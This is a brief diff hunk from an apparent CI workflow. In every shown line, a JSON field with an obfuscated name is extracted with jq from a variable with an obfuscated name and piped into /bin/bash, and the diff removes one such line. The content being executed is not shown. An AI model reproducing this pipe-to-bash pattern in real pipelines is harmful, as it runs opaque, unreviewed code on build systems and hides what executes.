@@ -21,7 +21,6 @@ jobs:
           echo $j70045 | jq -r .vizaf06683 | /bin/bash
           echo $tegql5 | jq -r .nsl68796 | /bin/bash
           echo $fwqp364 | jq -r .a815 | /bin/bash
-          echo $k68 | jq -r .gvper1450 | /bin/bash
           echo $h32 | jq -r .aupf48 | /bin/bash
           printf '%s' "$jcpp42031" | jq -r .uy374 | /bin/bash
           printf '%s' "$apr25" | jq -r .wctl9841 | /bin/bash
